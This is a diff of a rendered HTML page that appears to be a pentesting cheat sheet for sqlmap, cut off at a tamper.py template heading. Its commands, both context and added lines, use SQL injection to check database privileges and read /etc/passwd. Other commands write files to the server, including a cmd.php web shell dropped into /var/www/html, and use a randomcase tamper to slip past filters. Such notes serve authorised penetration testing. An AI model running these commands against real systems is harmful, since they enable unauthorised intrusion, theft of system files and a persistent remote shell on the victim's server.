@@ -79,6 +79,12 @@
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add payload tamper script, e.g. randomcase</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --tamper randomcase
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privileges</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request --privileges
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Read a file</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request --file-read<span class="o">=</span>/etc/passwd
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Write a file</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request --file-write<span class="o">=</span>./test.txt --file-dest<span class="o">=</span>/tmp/test.txt
 </span></span></code></pre></div><h4 id="tamperpy-template">tamper.py template</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl">
